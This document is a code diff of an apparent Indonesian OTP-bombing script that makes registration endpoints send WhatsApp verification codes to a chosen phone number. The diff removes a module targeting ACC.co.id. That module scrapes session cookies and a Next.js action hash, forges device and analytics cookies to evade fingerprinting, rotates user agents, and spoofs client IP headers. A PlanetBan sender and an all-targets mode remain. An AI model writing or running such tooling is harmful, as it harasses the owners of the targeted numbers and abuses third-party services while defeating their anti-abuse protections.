@@ -6,7 +6,6 @@ import json
 import time
 import sys
 import os
-import re
 import signal
 import random
 import uuid
@@ -45,9 +44,7 @@ console = Console()
 APIS = {
     1: {"name": "PlanetBan",   "desc": "WhatsApp",  "tag": "PLB",
         "cooldown": 60, "color": "bright_red",    "method": "planetban"},
-    2: {"name": "ACC.co.id",   "desc": "WhatsApp",  "tag": "ACC",
-        "cooldown": 60, "color": "bright_yellow",  "method": "acc"},
-    3: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
+    2: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
         "cooldown": 0,  "color": "bold cyan",      "method": "all"},
 }
 
@@ -131,13 +128,6 @@ BANNER = """\
 # ══════════════════════════════════════════════════════════════
 
 cooldown_tracker: dict = {}   # { phone: { method: sent_at } }
-
-# Cache session ACC.co.id (cookies + next-action hash)
-_acc_cache: dict = {
-    "action_hash": "7fd7799322a505bdfacd0dcd6cac5aa319e2350972",
-    "cookies":     {},
-    "fetched_at":  0,
-}
 
 # ══════════════════════════════════════════════════════════════
 #  HELPERS
@@ -297,59 +287,6 @@ def safe_post(url: str, headers: dict, data=None, files=None,
     return {"status": last_code, "body": last_body}
 
 # ══════════════════════════════════════════════════════════════
-#  ACC SESSION — scrape cookies + next-action hash
-# ══════════════════════════════════════════════════════════════
-
-def _refresh_acc_session(force: bool = False):
-    """GET halaman ACC register untuk dapat cookies segar dan next-action hash."""
-    global _acc_cache
-    now = time.time()
-    # refresh tiap 8 menit atau saat dipaksa
-    if not force and _acc_cache["fetched_at"] and (now - _acc_cache["fetched_at"]) < 480:
-        return
-
-    ua = rand_ua()
-    try:
-        sess = requests.Session()
-        r = sess.get(
-            "https://www.acc.co.id/register/new-account",
-            headers={
-                "User-Agent":      ua,
-                "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-                "Accept-Encoding": "gzip, deflate, br",
-                "Sec-Fetch-Dest":  "document",
-                "Sec-Fetch-Mode":  "navigate",
-                "Sec-Fetch-Site":  "none",
-                "Sec-Fetch-User":  "?1",
-                "Cache-Control":   "max-age=0",
-            },
-            timeout=15,
-            allow_redirects=True,
-        )
-
-        # Cari next-action hash di HTML (40+ hex chars dalam quotes)
-        # Next.js Server Action hash muncul sebagai data attribute atau dalam script
-        patterns = [
-            r'next-action["\s:=]+["\']([0-9a-f]{40,})["\']',
-            r'"([0-9a-f]{64})"',   # SHA-256 style
-            r'"([0-9a-f]{40})"',   # SHA-1 style
-        ]
-        for pat in patterns:
-            m = re.search(pat, r.text, re.IGNORECASE)
-            if m:
-                _acc_cache["action_hash"] = m.group(1)
-                break
-
-        # Ambil cookies dari session
-        _acc_cache["cookies"]    = dict(sess.cookies)
-        _acc_cache["fetched_at"] = now
-
-    except Exception:
-        # Gagal GET = pakai cache lama / default hash
-        pass
-
-# ══════════════════════════════════════════════════════════════
 #  API FUNCTIONS
 # ══════════════════════════════════════════════════════════════
 
@@ -367,113 +304,8 @@ def send_planetban(phone: str) -> dict:
         data=json.dumps({"phone": pb, "purpose": "register", "method": "whatsapp"}),
     )
 
-def send_acc(phone: str) -> dict:
-    """
-    ACC.co.id OTP via WhatsApp.
-    Alur: GET dulu untuk dapat cookies segar + next-action hash → POST dengan session.
-    """
-    num   = phone if phone.startswith("62") else "62" + phone.lstrip("0")
-    local = "0" + num[2:]
-
-    # Refresh session jika cache kosong/kedaluwarsa
-    _refresh_acc_session()
-
-    action_hash = _acc_cache["action_hash"]
-    cookies     = _acc_cache["cookies"]
-
-    # Random deviceId untuk bypass fingerprint device
-    dev_id    = rand_ua()           # deviceId = URL-encoded UA di original
-    mp_uuid   = str(uuid.uuid4())   # mixpanel distinct_id
-
-    ua  = rand_ua()
-    sch = rand_sec_ch()
-    ip  = rand_ip()
-
-    payload = json.dumps([{
-        "user_id":  None,
-        "action":   "register",
-        "send_to":  local,
-        "provider": "whatsapp",
-    }])
-
-    # Bangun cookie string: sertakan cookies dari GET + random identifiers
-    cookie_parts = []
-    for k, v in cookies.items():
-        cookie_parts.append(f"{k}={v}")
-    # Tambah cookies wajib jika belum ada dari GET
-    if "deviceId" not in cookies:
-        cookie_parts.append(f"deviceId={requests.utils.quote(dev_id)}")
-    if not any("mixpanel" in k for k in cookies):
-        mp_data = {
-            "distinct_id": f"$device:{mp_uuid}",
-            "$device_id":  mp_uuid,
-            "$initial_referrer": "$direct",
-            "$initial_referring_domain": "$direct",
-        }
-        cookie_parts.append(f"mp_e88342495971d35d9d9164ffba696eec_mixpanel={requests.utils.quote(json.dumps(mp_data))}")
-
-    cookie_str = "; ".join(cookie_parts)
-
-    headers = {
-        "User-Agent":            ua,
-        "Accept":                "text/x-component",
-        "Accept-Encoding":       "gzip, deflate, br, zstd",
-        "Accept-Language":       random.choice([
-            "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-            "id-ID,id;q=0.9",
-        ]),
-        "Content-Type":          "text/plain",
-        "next-action":           action_hash,
-        "next-router-state-tree": (
-            "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A"
-            "%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children"
-            "%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D"
-            "%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
-        ),
-        "Origin":                "https://www.acc.co.id",
-        "Referer":               "https://www.acc.co.id/register/new-account",
-        "Sec-Fetch-Site":        "same-origin",
-        "Sec-Fetch-Mode":        "cors",
-        "Sec-Fetch-Dest":        "empty",
-        "sec-ch-ua-platform":    '"Android"',
-        "sec-ch-ua-mobile":      "?1",
-        "sec-ch-ua":             sch,
-        "X-Requested-With":      "com.chimbori.hermitcrab",
-        "X-Forwarded-For":       ip,
-        "X-Real-IP":             ip,
-        "Cookie":                cookie_str,
-    }
-
-    result = safe_post(
-        "https://www.acc.co.id/register/new-account",
-        headers=headers,
-        data=payload,
-    )
-
-    # Jika gagal → force refresh session lalu coba sekali lagi
-    if not is_ok(result["status"]):
-        _refresh_acc_session(force=True)
-        action_hash = _acc_cache["action_hash"]
-        headers["next-action"] = action_hash
-        # Rebuild cookie dengan data segar
-        cookie_parts2 = []
-        for k, v in _acc_cache["cookies"].items():
-            cookie_parts2.append(f"{k}={v}")
-        if "deviceId" not in _acc_cache["cookies"]:
-            cookie_parts2.append(f"deviceId={requests.utils.quote(rand_ua())}")
-        headers["Cookie"] = "; ".join(cookie_parts2)
-        result = safe_post(
-            "https://www.acc.co.id/register/new-account",
-            headers=headers,
-            data=payload,
-        )
-
-    return result
-
-
 def dispatch(method: str, phone: str) -> dict:
     if method == "planetban": return send_planetban(phone)
-    if method == "acc":       return send_acc(phone)
     return {}
 
 # ══════════════════════════════════════════════════════════════
